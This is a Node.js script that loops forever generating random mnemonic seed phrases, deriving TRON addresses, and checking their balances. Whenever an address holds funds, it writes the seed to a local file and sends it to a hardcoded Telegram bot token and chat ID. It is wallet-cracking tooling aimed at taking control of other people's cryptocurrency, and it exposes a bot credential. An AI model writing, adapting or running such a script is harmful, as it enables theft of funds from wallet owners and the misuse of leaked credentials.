const bip39 = require('bip39');
const ecc = require('tiny-secp256k1');
const { BIP32Factory } = require('bip32');
const TronWeb = require('tronweb');
const ethers = require('ethers');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

const bip32 = BIP32Factory(ecc);

// Telegram Bot Token and Chat ID
const telegramToken = '6746587815:AAHBufzR0LXNq_n3bt6hlQU8k2c7ykLMD48';
const chatId = '5379040566';
const bot = new TelegramBot(telegramToken, { polling: false });

// File to save mnemonics and balances
const saveFilePath = path.join(__dirname, 'mnemonics.txt');

// Function to save mnemonics and balances to a text file
function saveToFile(data) {
  try {
    const entry = `Mnemonic: ${data.mnemonic}\nTRON Address: ${data.tronAddress}\nTRON Balance: ${data.balance} TRX\n\n`;
    fs.appendFileSync(saveFilePath, entry, 'utf8');
    console.log('Data saved to file:', saveFilePath);
  } catch (error) {
    console.error('Error saving to file:', error);
  }
}

// Function to check TRON balance
async function checkTronBalance() {
  try {
    // Generate a new mnemonic phrase
    const mnemonic = ethers.Wallet.createRandom().mnemonic.phrase;
    console.log('Seed Phrase:', mnemonic);

    // Convert mnemonic to seed
    const seed = bip39.mnemonicToSeedSync(mnemonic);
    const root = bip32.fromSeed(seed);

    // TRON path
    const tronPath = "m/44'/195'/0'/0/0";

    const tronNode = root.derivePath(tronPath);
    const tronPrivateKey = tronNode.privateKey.toString('hex');
    const tronAddress = TronWeb.address.fromPrivateKey(tronPrivateKey);
    console.log('TRON Address:', tronAddress);

    // Set up TRON Web instance
    const tronWeb = new TronWeb({
      fullHost: 'https://api.trongrid.io',
    });

    // Get TRON balance
    const balance = await tronWeb.trx.getBalance(tronAddress);
    const balanceInTRX = balance / 1e6;
    console.log('TRON Balance:', balanceInTRX, 'TRX');

    // Only save and send if balance is greater than 0
    if (balanceInTRX > 0) {
      // Save mnemonic and balance
      const data = {
        mnemonic,
        balance: balanceInTRX,
        tronAddress
      };
      saveToFile(data);

      // Send to Telegram bot
      const message = `Mnemonic: ${mnemonic}\nTRON Address: ${tronAddress}\nTRON Balance: ${balanceInTRX} TRX`;
      bot.sendMessage(chatId, message);

      console.log('Message sent to Telegram');
    } else {
      console.log('Balance is 0. Not saving or sending.');
    }
  } catch (error) {
    console.error('Error:', error);
  }
}

// Main function to run the process in a loop
(async function main() {
  while (true) {
    try {
      await checkTronBalance();
      // Add a slight delay to prevent excessive rapid execution
      await new Promise(resolve => setTimeout(resolve, 1)); // 10 seconds delay, adjust as needed
    } catch (error) {
      console.error('Unexpected error:', error);
    }
  }
})();